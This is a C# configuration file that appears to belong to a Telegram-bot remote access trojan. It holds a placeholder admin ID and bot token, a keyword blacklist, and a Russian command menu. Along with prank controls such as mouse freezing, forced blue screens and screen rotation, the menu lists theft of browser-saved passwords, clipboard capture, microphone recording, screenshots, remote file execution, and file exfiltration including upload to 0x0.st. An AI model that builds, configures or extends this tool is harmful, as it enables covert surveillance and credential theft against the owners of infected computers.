namespace PRNKBT
{
    class Config
    {
        #region Required Settings
        internal static int admin = 111111111; // Your Telegram ID
        internal static string token = "token"; // Your Bot Token
        #endregion
        #region BlackList for Blocker
        internal static string[] blacklist = new string[]
        {
            "аниме",
            "хентай",
            "манго",
            "порно",
            "секс",
            "sex",
            "porno",
            "porn",
            "hentai",
            "anime"
        };
        #endregion
        #region HelpText
        internal static string main_menu = string.Concat(new string[] {
            "---===Троллинг===---\n",
            "/flash - Ослепить человека! ❌\n",
            "/fmouse - Заморозить мышь! ❌\n",
            "/unfmouse - Разморозить мышь! ⭕\n",
            "/tpmouse - Телепортировать курсор! 🚀\n",
            "/type [Text] - Ввести текст! ⌨\n",
            "/wasd - Нажать рандомную клавишу [\"w\", \"a\", \"s\", \"d\"]! ⌨\n",
            "/hideall - Свернуть все окна (Win+D)!\n",
            "/enblocker - Включить блокер!\n",
            "/disblocker - Выключить блокер!\n",
            "/cmd - Запустить командную строку! 🏧\n",
            "/bsod - Синий экран смерти 🔚\n",
            "/chwall [Photo as file] - Установить картинку как обои! 🖼\n",
            "/dr0 - Повернуть экран на 0°! 🔁\n",
            "/dr90 - Повернуть экран на 90°! 🔁\n",
            "/dr180 - Повернуть экран на 180°! 🔁\n",
            "/dr270 - Повернуть экран на 270°! 🔁\n",
            "/showclock - Показать часы в панели задач ✅\n",
            "/hideclock - Скрыть часы в панели задач ❎\n",
            "/showtb - Показать панель задач ✅\n",
            "/hidetb - Скрыть  панель задач ❎\n",
            "/kill_active - Выключить активное приложение (Alt+F4)! 🛑\n\n",
            "---===Процессы===---\n",
            "/ps - Список процессов 📃\n",
            "/kill [PID] - Убить процесс ❌\n",
            "/run [FileName/FilePath] - Запуск файла ✅\n\n",
            "---===Буфер_Обмнеа===---\n",
            "/clipget - Получить содержимое буфера обмена 📃\n",
            "/clipset - Установить текст в буфер обмена ✅\n",
            "/clipclear - Очистить буфер обмена ❌\n\n",
            "---===Директории/Файлы===---\n",
            "/pwd - Текущая директория 💠\n",
            "/ls - Список директорий и файлов 📃\n",
            "/lsd - Список директорий 📃\n",
            "/lsf - Список файлов 📃\n",
            "/cd [DirPath] - Перейти в директорию 👣\n",
            "/mkdir [DirName/DirPath] - Создать директорию 🆕\n",
            "/rmdir [DirName/DirPath] - Удалить директорию ❌\n",
            "/touch [FileName/FilePath] - Создать файл 🆕\n",
            "/rm [FileName/FilePath] - Удалить файл ❌\n",
            "/download [FileName/FilePath] - Скачать файл с ПК (До 50мб) 🆙\n",
            "/dl [FileName/FilePath] - Скачать файл с ПК на 0x0.st (До 512мб) 🆙\n",
            "/upload [Url] - Загрузить файл на пк по ссылке (До ♾мб) 🔽\n",
            "P.S Для загрузки файла на пк, отправьте его мне как документ (До 20мб)\n\n",
            "---===Другое===---\n",
            "/recmic [Seconds] - Записать звук с основного микрофона 🎤\n",
            "/passwds - Сохранённые пароли в браузерах 🔑\n",
            "/ip - Текущий IP пользователя 🌐\n",
            "/ss - Скриншот 📷\n",
            "/sshd - Скриншот в максимальном качестве 📸\n",
            "/info - Информация о ПК 🗒"
        });
        #endregion
        #region KeyboardButtonsNames
        internal static string kbtn_info = "Information ✔";
        internal static string kbtn_ip = "IP 🆔";
        internal static string kbtn_fmouse = "Freeze 🖱";
        internal static string kbtn_unfmouse = "Unfreeze 🖱";
        internal static string kbtn_tpmouse = "Teleport 🖱";
        internal static string kbtn_hideall = "Hide all 🔱";
        internal static string kbtn_kill_active = "Kill Active App";
        internal static string kbtn_cmd = "Open CMD 💻";
        internal static string kbtn_passwds = "Passwords 🔑";
        internal static string kbtn_wasd = "Random Tap (W, A, S, D)";
        internal static string kbtn_pwd = "Current Directory 🟩";
        internal static string kbtn_ls = "List 📃";
        internal static string kbtn_lsf = "List Files 📃";
        internal static string kbtn_lsd = "List Diretories 📃";
        internal static string kbtn_ss = "Screenshot 📷";
        internal static string kbtn_sshd = "HD Screenshot 📸";
        internal static string kbtn_dr0 = "0°";
        internal static string kbtn_dr90 = "90°";
        internal static string kbtn_dr180 = "180°";
        internal static string kbtn_dr270 = "270°";
        internal static string kbtn_bsod = "BSOD *️⃣";
        internal static string kbtn_enblocker = "EnBlocker ✅";
        internal static string kbtn_disblocker = "DisBlocker ❌";
        internal static string kbtn_showclock = "Show 🕒";
        internal static string kbtn_hideclock = "Hide 🕒";
        internal static string kbtn_showtb = "Show TaskBar 〰";
        internal static string kbtn_hidetb = "Hide TaskBar 〰";
        internal static string kbtn_ps = "Process List ☑";
        internal static string kbtn_flash = "Flash ⬜";
        internal static string kbtn_clipget = "Get Clipboard 🔢";
        internal static string kbtn_clipclear = "Clear Clipboard ❌";
        // internal static string kbtn_ = "";
        #endregion
    }
}
